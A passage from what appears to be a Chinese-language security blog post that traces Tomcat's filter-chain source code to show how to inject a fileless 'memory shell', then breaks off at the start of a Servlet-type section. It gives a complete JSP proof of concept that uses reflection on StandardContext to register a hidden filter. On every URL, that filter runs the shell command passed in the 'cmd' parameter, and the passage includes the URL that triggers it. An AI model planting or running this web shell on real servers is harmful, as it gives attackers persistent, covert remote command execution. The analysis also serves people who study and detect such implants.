class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">doFilter:<span class="hljs-number">11</span>, Shell_Filter (Filter)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>invoke:<span class="hljs-number">197</span>, StandardWrapperValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">97</span>, StandardContextValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">540</span>, AuthenticatorBase (org.apache.catalina.authenticator)<br>invoke:<span class="hljs-number">135</span>, StandardHostValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">92</span>, ErrorReportValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">78</span>, StandardEngineValve (org.apache.catalina.core)<br>service:<span class="hljs-number">357</span>, CoyoteAdapter (org.apache.catalina.connector)<br>service:<span class="hljs-number">382</span>, Http11Processor (org.apache.coyote.http11)<br>process:<span class="hljs-number">65</span>, AbstractProcessorLight (org.apache.coyote)<br>process:<span class="hljs-number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:<span class="hljs-number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:<span class="hljs-number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)<br>runWorker:<span class="hljs-number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>跟进<code>ApplicationFilterChain#internalDoFilter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,ServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-comment">// Call the next filter if there is one</span><br>        <span class="hljs-keyword">if</span> (pos &lt; n) &#123;<br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++];<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> filterConfig.getFilter(); <span class="hljs-comment">//获取Filter</span><br> <br>                <span class="hljs-keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="hljs-string">&quot;false&quot;</span>.equalsIgnoreCase(<br>                        filterConfig.getFilterDef().getAsyncSupported())) &#123;<br>                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);<br>                &#125;<br>                <span class="hljs-keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> request;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> response;<br>                    <span class="hljs-type">Principal</span> <span class="hljs-variable">principal</span> <span class="hljs-operator">=</span><br>                        ((HttpServletRequest) req).getUserPrincipal();<br> <br>                    Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;req, res, <span class="hljs-built_in">this</span>&#125;;<br>                    SecurityUtil.doAsPrivilege (<span class="hljs-string">&quot;doFilter&quot;</span>, filter, classType, args, principal);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    filter.doFilter(request, response, <span class="hljs-built_in">this</span>);<span class="hljs-comment">//* doFilter的调用</span><br>                &#125;<br>            &#125; <br>...<br>    &#125;<br></code></pre></td></tr></table></figure><p>查看一下获取Filter的机制，<code>filterConfig</code>是<code>filters</code>数组成员，一个<code>ApplicationFilterConfig</code>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> ApplicationFilterConfig[] filters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[<span class="hljs-number">0</span>];<br><span class="hljs-comment">//...</span><br><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++]<br></code></pre></td></tr></table></figure><p>跟进查看一下<code>filters</code>数组的赋值时机,在<code>StandardWrapperValve#invoke()</code>方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>  <span class="hljs-comment">//...</span><br>    <span class="hljs-comment">// Create the filter chain for this request</span><br>  <span class="hljs-type">ApplicationFilterChain</span> <span class="hljs-variable">filterChain</span> <span class="hljs-operator">=</span> ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);<br></code></pre></td></tr></table></figure><p>跟进<code>createFilterChain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ApplicationFilterChain <span class="hljs-title function_">createFilterChain</span><span class="hljs-params">(ServletRequest request,</span><br><span class="hljs-params">            Wrapper wrapper, Servlet servlet)</span> &#123;<br>        <span class="hljs-comment">//...</span><br>        filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>(); <span class="hljs-comment">//创建一个空的filterChain</span><br>        filterChain.setServlet(servlet);<br>        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());<br> <br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) wrapper.getParent();<span class="hljs-comment">//得到StandardContext</span><br>        FilterMap filterMaps[] = context.findFilterMaps();<span class="hljs-comment">//获取其中的FilterMaps,里面存储里各Filter的信息</span><br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> wrapper.getName();<span class="hljs-comment">//获取名称</span><br> <br>        <span class="hljs-keyword">for</span> (FilterMap filterMap : filterMaps) &#123; <span class="hljs-comment">//遍历得到对应FilterConfig</span><br>            <span class="hljs-comment">//...</span><br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig)<br>                    context.findFilterConfig(filterMap.getFilterName());<br>            <span class="hljs-comment">//...</span><br>            filterChain.addFilter(filterConfig);<br>        &#125;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">return</span> filterChain;<span class="hljs-comment">//将获取到的ApplicationFilterConfig整合返回</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进<code>ApplicationFilterChain#addFilter</code>看一下添加机制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">addFilter</span><span class="hljs-params">(ApplicationFilterConfig filterConfig)</span> &#123;<br>        <span class="hljs-comment">//防止重复添加</span><br>        <span class="hljs-keyword">for</span>(ApplicationFilterConfig filter:filters) &#123;<br>            <span class="hljs-keyword">if</span>(filter==filterConfig) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (n == filters.length) &#123;<br>            ApplicationFilterConfig[] newFilters =<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[n + INCREMENT];<br>            System.arraycopy(filters, <span class="hljs-number">0</span>, newFilters, <span class="hljs-number">0</span>, n);<br>            filters = newFilters;<br>        &#125;<br>        filters[n++] = filterConfig;<br> <br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="Filter动态注册"><a href="#Filter动态注册" class="headerlink" title="Filter动态注册"></a>Filter动态注册</h4><p>通过上述流程可以知道，每次请求的 FilterChain 是动态匹配获取和生成的，如果想添加一个 Filter ，需要在 StandardContext 中 filterMaps 中添加 FilterMap，在 filterConfigs 中添加 ApplicationFilterConfig。这样程序创建时就可以找到添加的 Filter 了。</p><p>这里先说一个前提条件，Filter 配置在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式：</p><ol><li>使用 ServletContext 的 addFilter&#x2F;createFilter 方法注册；</li><li>使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册；</li><li>使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态）。</li></ol><p>这里只讨论第一种，并先关注比较重要的addFilter方法</p><p>在<code>ServletContext</code>接口中有声明了3个<code>addFilter</code>方法，其实现在 <code>org.apache.catalina.core.ApplicationContext#addFilter</code> 中。这里以Tomcat 10.0.23为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> FilterRegistration.Dynamic <span class="hljs-title function_">addFilter</span><span class="hljs-params">(String filterName,</span><br><span class="hljs-params">        String filterClass, Filter filter)</span> <span class="hljs-keyword">throws</span> IllegalStateException &#123;<br>    <span class="hljs-keyword">if</span> (filterName == <span class="hljs-literal">null</span> || filterName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<span class="hljs-comment">//filterName不能为空</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(sm.getString(<br>                <span class="hljs-string">&quot;applicationContext.invalidFilterName&quot;</span>, filterName));<br>    &#125;<br>  <span class="hljs-comment">//这里的context是StandardContext类型</span><br>    <span class="hljs-keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;<span class="hljs-comment">//判断context的state是否是程序刚启动的state</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br>                sm.getString(<span class="hljs-string">&quot;applicationContext.addFilter.ise&quot;</span>,<br>                        getContextPath()));<br>    &#125;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> context.findFilterDef(filterName);<span class="hljs-comment">//在context中根据 filterName 寻找FilterDef对象</span><br>    <span class="hljs-keyword">if</span> (filterDef == <span class="hljs-literal">null</span>) &#123;<br>        filterDef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>        filterDef.setFilterName(filterName);<br>        context.addFilterDef(filterDef);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (filterDef.getFilterName() != <span class="hljs-literal">null</span> &amp;&amp;<br>                filterDef.getFilterClass() != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//将Filter对象放入FilterDef中</span><br>    <span class="hljs-keyword">if</span> (filter == <span class="hljs-literal">null</span>) &#123;<br>        filterDef.setFilterClass(filterClass);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        filterDef.setFilterClass(filter.getClass().getName());<br>        filterDef.setFilter(filter);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterRegistration</span>(filterDef, context);<span class="hljs-comment">//包装FilterDef和context返回</span><br>&#125;<br></code></pre></td></tr></table></figure><p>从传参可以看出filterDef必要的属性为<code>filter</code>、<code>filterClass</code>以及<code>filterName</code>,动调一下会发现其实filterClass、filterName对应的其实就是web.xml中的<code>&lt;filter&gt;</code>标签。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;filter&gt;<br>    &lt;filter-name&gt;&lt;/filter-name&gt;<br>    &lt;filter-class&gt;&lt;/filter-class&gt;<br>&lt;/filter&gt;<br></code></pre></td></tr></table></figure><blockquote><p>并且可以发现<code>ApplicationContext </code>的 <code>addFilter</code> 中将 filter 初始化存在了 <code>StandardContext</code> 的 <code>filterDefs</code> 中,但我们之前分析的<code>FilterChain</code>中的Filter是在<code>StandardContext</code>的<code>filterMaps</code>里获取</p><p>这里可以跟进看一下Filter是怎么被添加到其他参数中的</p></blockquote><p>在 <code>StandardContext</code> 的 <code>filterStart</code> 方法中生成了 <code>filterConfigs</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">filterStart</span><span class="hljs-params">()</span> &#123;<br><br>        <span class="hljs-keyword">if</span> (getLogger().isDebugEnabled()) &#123;<br>            getLogger().debug(<span class="hljs-string">&quot;Starting filters&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// Instantiate and record a FilterConfig for each defined filter</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">ok</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">synchronized</span> (filterConfigs) &#123;<br>            filterConfigs.clear();<br>            <span class="hljs-keyword">for</span> (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;<span class="hljs-comment">//遍历filterDefs</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> entry.getKey();<br>                <span class="hljs-keyword">if</span> (getLogger().isDebugEnabled()) &#123;<br>                    getLogger().debug(<span class="hljs-string">&quot; Starting filter &#x27;&quot;</span> + name + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//创建ApplicationFilterConfig对象并存入filterConfigs中</span><br>                    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span><br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>(<span class="hljs-built_in">this</span>, entry.getValue());<br>                    filterConfigs.put(name, filterConfig);<br>                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                    t = ExceptionUtils.unwrapInvocationTargetException(t);<br>                    ExceptionUtils.handleThrowable(t);<br>                    getLogger().error(sm.getString(<br>                            <span class="hljs-string">&quot;standardContext.filterStart&quot;</span>, name), t);<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ok;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>完成<code>filterDefs</code>–&gt;<code>filterConfigs</code></p></blockquote><p>在 ApplicationFilterRegistration 的 <code>addMappingForUrlPatterns</code> 中生成了 <code>filterMaps</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addMappingForUrlPatterns</span><span class="hljs-params">(</span><br><span class="hljs-params">            EnumSet&lt;DispatcherType&gt; dispatcherTypes, <span class="hljs-type">boolean</span> isMatchAfter,</span><br><span class="hljs-params">            String... urlPatterns)</span> &#123;<br>        <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>        filterMap.setFilterName(filterDef.getFilterName());<span class="hljs-comment">//从filterDef获取</span><br>        <span class="hljs-keyword">if</span> (dispatcherTypes != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (DispatcherType dispatcherType : dispatcherTypes) &#123;<br>                filterMap.setDispatcher(dispatcherType.name());<span class="hljs-comment">//给dispatcherMapping属性赋值</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (urlPatterns != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (String urlPattern : urlPatterns) &#123;<br>                filterMap.addURLPattern(urlPattern);<span class="hljs-comment">//给urlPatterns属性赋值</span><br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (isMatchAfter) &#123;<br>                context.addFilterMap(filterMap);<span class="hljs-comment">//整合filterMap</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                context.addFilterMapBefore(filterMap);<span class="hljs-comment">//整合filterMap</span><br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>fileMap从filterDef中获取了<code>FilterName</code>属性，后续又赋值了<code>urlPatterns</code>,<code>dispatcherMapping</code></p><blockquote><p>可以看到<code>filterMaps</code>的组成部分<code>filterMap</code>的信息是从filterDef中获取</p></blockquote><p>经过上面的分析，我们可以总结出动态添加恶意Filter的思路</p><ol><li>获取StandardContext对象</li><li>创建恶意Filter</li><li>使用FilterDef对Filter进行封装，并添加必要的属性</li><li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li><li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li></ol><h4 id="完整POC-1"><a href="#完整POC-1" class="headerlink" title="完整POC"></a>完整POC</h4><p>Filter.jsp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br> <br>&lt;%<span class="hljs-comment">//获取StandardContext对象</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>%&gt;<br> <span class="hljs-comment">//恶意Filter，主要是doFilter方法</span><br>&lt;%! <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>            chain.doFilter(request, response);<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//使用FilterDef封装filter</span><br>    <span class="hljs-type">Shell_Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Filter</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CommonFilter&quot;</span>;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilter(filter);<br>    filterDef.setFilterName(name);<br>    filterDef.setFilterClass(filter.getClass().getName());<br>    standardContext.addFilterDef(filterDef);<br> <span class="hljs-comment">//创建filterMap，filterMap用于路由映射</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    standardContext.addFilterMapBefore(filterMap);<br> <span class="hljs-comment">//反射封装filterConfig及filterDef到filterConfigs </span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br> <br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br>    filterConfigs.put(name, filterConfig);<br>%&gt;<br></code></pre></td></tr></table></figure><p>先注册恶意Filter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Filter.jsp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010440959.png" alt="image-20230201044023838"></p><h3 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h3><p>先创建一个恶意Servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 